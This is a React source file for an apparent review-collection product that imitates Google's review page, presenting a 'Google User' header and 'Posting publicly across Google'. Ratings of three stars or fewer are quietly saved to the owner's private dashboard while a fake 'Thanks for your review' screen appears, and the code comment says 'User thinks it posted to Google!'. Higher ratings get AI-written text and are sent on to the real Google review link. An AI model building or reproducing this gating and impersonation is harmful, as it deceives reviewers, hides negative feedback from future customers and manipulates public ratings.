import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';
import { Star, Camera, Sparkles, X, Info } from 'lucide-react';
import { businessCategories } from '../data/businessCategories';

export default function ReviewPage() {
  const { businessId } = useParams();
  
  // States for Business & UI
  const [business, setBusiness] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [pageError, setPageError] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  // States for Review Data
  const [overallRating, setOverallRating] = useState(0);
  const [subRatings, setSubRatings] = useState({});
  const [detailedAnswers, setDetailedAnswers] = useState({});
  const [feedbackText, setFeedbackText] = useState("");
  const [uploadedPhotos, setUploadedPhotos] = useState([]);

  // 1. Fetch Business Details on Load
  useEffect(() => {
    const fetchBusiness = async () => {
      try {
        const res = await axios.get(`https://google-review-saas-backend.onrender.com/api/business/public/${businessId}`);
        setBusiness(res.data);
      } catch (err) {
        setPageError("Invalid QR Code or Business not found.");
      } finally {
        setIsLoading(false);
      }
    };
    if (businessId) fetchBusiness();
  }, [businessId]);

  // 2. Cloudinary Photo Upload Logic
  const handlePhotoUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    // ⚠️ TODO: Apne Cloudinary Details yahan daalein
    const CLOUD_NAME = "YOUR_CLOUD_NAME"; 
    const UPLOAD_PRESET = "YOUR_UPLOAD_PRESET"; 

    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', UPLOAD_PRESET);

    try {
      const res = await axios.post(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, formData);
      setUploadedPhotos([...uploadedPhotos, res.data.secure_url]);
    } catch (err) {
      console.error("Photo upload failed:", err);
      alert("Failed to upload image. Please try again.");
    }
  };

  const removePhoto = (index) => {
    setUploadedPhotos(uploadedPhotos.filter((_, i) => i !== index));
  };

  // 3. AI Magic (Auto Write Review based on Selections)
  const generateAIReview = async () => {
    if (overallRating === 0) return alert("Please give a star rating first!");
    setIsProcessing(true);
    setFeedbackText("✨ AI is analyzing your selections and writing the review...");

    try {
      const selectedOptionsArray = Object.values(detailedAnswers);
      const res = await axios.post('https://google-review-saas-backend.onrender.com/api/reviews/generate', {
        businessName: business.businessName || business.cafeName,
        category: business.businessCategory || 'cafe',
        tags: selectedOptionsArray, 
        rating: overallRating
      });
      setFeedbackText(res.data.reviewText);
    } catch (error) {
      setFeedbackText("The food and vibe were amazing! Highly recommended.");
    } finally {
      setIsProcessing(false);
    }
  };

  // 4. THE MASTER LOGIC (Negative = Dashboard, Positive = Google Maps)
  const handlePostReview = async () => {
    if (overallRating === 0) return alert("Please select a rating to continue.");
    setIsProcessing(true);

    const isNegative = overallRating <= 3; // 1, 2, 3 stars are treated as negative/neutral

    try {
      if (isNegative) {
        // 🔴 NEGATIVE FLOW: Save to Owner's Private Dashboard & Show Fake Google Success
        await axios.post('https://google-review-saas-backend.onrender.com/api/feedback/internal', {
          businessId: business._id,
          overallRating,
          subRatings,
          detailedAnswers,
          text: feedbackText,
          photos: uploadedPhotos
        });
        
        setIsProcessing(false);
        setIsSuccess(true); // User thinks it posted to Google!
      } else {
        // 🟢 POSITIVE FLOW: Copy Text & Redirect to Real Google Maps
        if (feedbackText) {
          await navigator.clipboard.writeText(feedbackText);
        }
        setIsProcessing(false);
        
        // Timeout taki user ko feel ho ki processing hui
        setTimeout(() => {
          window.location.href = business.googleReviewLink;
        }, 800);
      }
    } catch (error) {
      console.error("Error posting review:", error);
      setIsProcessing(false);
    }
  };

  // Loading & Error States
  if (isLoading) return <div className="min-h-screen bg-[#202124] flex items-center justify-center text-blue-400">Loading Google Reviews...</div>;
  if (pageError) return <div className="min-h-screen bg-[#202124] flex items-center justify-center text-red-400">{pageError}</div>;

  // Fake Success Screen for Negative Reviews
  if (isSuccess) {
    return (
      <div className="min-h-screen bg-[#202124] text-white flex flex-col items-center justify-center p-4">
        <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-4">
          <Star className="text-blue-400 w-8 h-8 fill-blue-400" />
        </div>
        <h2 className="text-2xl font-bold mb-2">Thanks for your review</h2>
        <p className="text-gray-400 text-sm">Your feedback helps others make better decisions.</p>
      </div>
    );
  }

  // Current Business Data
  const currentCategoryData = businessCategories[business.businessCategory || 'cafe'];
  const displayName = business.businessName || business.cafeName;

  return (
    <div className="min-h-screen bg-[#202124] text-gray-200 p-4 sm:p-6 font-sans">
      <div className="max-w-md mx-auto">
        
        {/* Header - Native Google Clone */}
        <div className="text-center mb-6 pt-4">
          <h1 className="text-xl font-medium">{displayName}</h1>
        </div>

        <div className="flex items-center gap-3 mb-8">
          <div className="w-10 h-10 bg-[#E8710A] rounded-full flex items-center justify-center font-bold text-lg text-white">
            G
          </div>
          <div>
            <p className="font-medium text-[15px]">Google User</p>
            <p className="text-[12px] text-gray-400 flex items-center gap-1">
              Posting publicly across Google <Info className="w-3 h-3" />
            </p>
          </div>
        </div>

        {/* Main Star Rating */}
        <div className="flex justify-center gap-2 mb-8">
          {[1, 2, 3, 4, 5].map((star) => (
            <Star 
              key={star} 
              onClick={() => setOverallRating(star)}
              className={`w-11 h-11 cursor-pointer transition-colors ${
                overallRating >= star ? 'text-[#FBBC04] fill-[#FBBC04]' : 'text-gray-600'
              }`} 
            />
          ))}
        </div>

        {/* Dynamic Sub-Ratings (Only show if rated) */}
        {overallRating > 0 && (
          <div className="animate-fade-in mb-8">
            {currentCategoryData.ratingCategories?.map((cat) => (
              <div key={cat} className="flex justify-between items-center mb-5">
                <span className="text-[15px]">{cat}</span>
                <div className="flex gap-2">
                  {[1, 2, 3, 4, 5].map((star) => (
                    <Star 
                      key={star} 
                      onClick={() => setSubRatings({ ...subRatings, [cat]: star })}
                      className={`w-7 h-7 cursor-pointer transition-colors ${
                        (subRatings[cat] || 0) >= star ? 'text-[#FBBC04] fill-[#FBBC04]' : 'text-gray-600'
                      }`} 
                    />
                  ))}
                </div>
              </div>
            ))}

            {/* AI Text Area Box */}
            <div className="relative mt-6">
              <textarea 
                value={feedbackText}
                onChange={(e) => setFeedbackText(e.target.value)}
                placeholder="Share details of your own experience at this place"
                className="w-full bg-transparent border border-gray-600 rounded-xl p-4 text-[15px] min-h-[120px] focus:outline-none focus:border-blue-400 placeholder-gray-500 leading-relaxed"
              />
              <button 
                onClick={generateAIReview}
                disabled={isProcessing}
                className="absolute right-3 bottom-3 bg-[#303134] hover:bg-[#3c4043] text-blue-400 text-xs font-medium py-1.5 px-3 rounded-full flex items-center gap-1 border border-gray-600"
              >
                <Sparkles className="w-3 h-3" /> Auto-Write
              </button>
            </div>

            {/* Cloudinary Photo Upload */}
            <div className="mt-4">
              <label className="border border-gray-600 rounded-full py-2 px-4 flex items-center justify-center gap-2 text-blue-400 text-[14px] font-medium cursor-pointer hover:bg-[#303134] transition-colors w-full">
                <Camera className="w-5 h-5" />
                Add photos and videos
                <input type="file" className="hidden" accept="image/*,video/*" onChange={handlePhotoUpload} />
              </label>
              
              {/* Image Previews */}
              {uploadedPhotos.length > 0 && (
                <div className="flex flex-wrap gap-3 mt-4">
                  {uploadedPhotos.map((url, i) => (
                    <div key={i} className="relative">
                      <img src={url} alt="upload" className="w-20 h-20 object-cover rounded-lg border border-gray-600" />
                      <button 
                        onClick={() => removePhoto(i)}
                        className="absolute -top-2 -right-2 bg-gray-800 rounded-full p-1 border border-gray-600 text-gray-300"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Dynamic Detailed Questions (Like Google Maps) */}
            <div className="mt-8 space-y-6">
              {currentCategoryData.detailedQuestions?.map((q) => (
                <div key={q.id} className="bg-[#303134] p-5 rounded-2xl">
                  <p className="text-[15px] font-medium mb-4">{q.question}</p>
                  <div className="flex flex-wrap gap-2.5">
                    {q.options.map((opt) => (
                      <button 
                        key={opt}
                        onClick={() => setDetailedAnswers({ ...detailedAnswers, [q.id]: opt })}
                        className={`px-4 py-2 rounded-lg text-[14px] transition-colors border ${
                          detailedAnswers[q.id] === opt 
                          ? 'bg-[#8AB4F8] text-[#202124] border-[#8AB4F8] font-medium' 
                          : 'bg-transparent border-gray-500 text-gray-200 hover:bg-[#3c4043]'
                        }`}
                      >
                        {opt}
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>

          </div>
        )}
      </div>

      {/* Sticky Bottom Actions */}
      <div className="fixed bottom-0 left-0 w-full bg-[#202124] border-t border-gray-700 p-3 flex justify-end gap-4">
        <button className="text-[#8AB4F8] text-[14px] font-medium px-4 py-2">
          Cancel
        </button>
        <button 
          onClick={handlePostReview}
          disabled={overallRating === 0 || isProcessing}
          className={`px-6 py-2 rounded-full text-[14px] font-medium transition-colors ${
            overallRating > 0 && !isProcessing
            ? 'bg-[#8AB4F8] text-[#202124] hover:bg-blue-300' 
            : 'bg-[#3c4043] text-gray-500 cursor-not-allowed'
          }`}
        >
          {isProcessing ? 'Posting...' : 'Post'}
        </button>
      </div>

    </div>
  );
}